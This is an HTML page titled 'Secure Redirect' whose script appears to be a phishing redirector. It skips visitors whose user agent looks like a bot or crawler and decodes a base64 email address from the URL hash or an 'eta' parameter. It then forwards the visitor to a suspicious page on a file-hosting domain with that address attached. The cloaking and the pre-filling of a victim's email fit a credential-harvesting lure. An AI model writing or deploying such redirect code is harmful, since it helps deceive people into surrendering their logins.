<!DOCTYPE html>
<html>
<head>
  <title>Secure Redirect</title>
  <meta name="robots" content="noindex">
</head>
<body>
  <p>Redirecting...</p>
  <script>
    // Only redirect if the user-agent isn't a bot
    if (!/bot|crawler|spider/i.test(navigator.userAgent)) {
      // Extract eta from query parameters
      var urlParams = new URLSearchParams(window.location.search);
      var eta = urlParams.get('eta');
      // Extract hash
      var hash = window.location.hash ? window.location.hash.substring(1) : null;
      // Use hash if present, otherwise eta
      var param = hash || eta || '';
      // Get the processed parameter and decode it
      var url_get_email = atob(getafterhash(param));
      // Construct the redirect URL
      var redirect_url = "https://filedn.com/ln4wgGq2357YYmTzByLSYTQ/errrresee.shtml#" + url_get_email;
      window.location.href = redirect_url;
    }

    function getafterhash(url) {
      var ret;
      // If no parameter is provided, return 0
      if (!url) {
        ret = 0;
      } else {
        // Check for alternative separators
        var queryStringhash = url.split('#')[1];
        var queryStringsemi = url.split(';')[1];
        var queryStringsemiplus = url.split(';+')[1];
        var queryStringstartsemi = url.split('*;')[1];
        // Prioritize the first valid separator
        if (queryStringhash) {
          ret = queryStringhash;
        } else if (queryStringsemi) {
          ret = queryStringsemi;
        } else if (queryStringsemiplus) {
          ret = queryStringsemiplus;
        } else if (queryStringstartsemi) {
          ret = queryStringstartsemi;
        } else {
          ret = url; // Use the full parameter if no separators
        }
      }
      return ret;
    }
  </script>
</body>
</html>
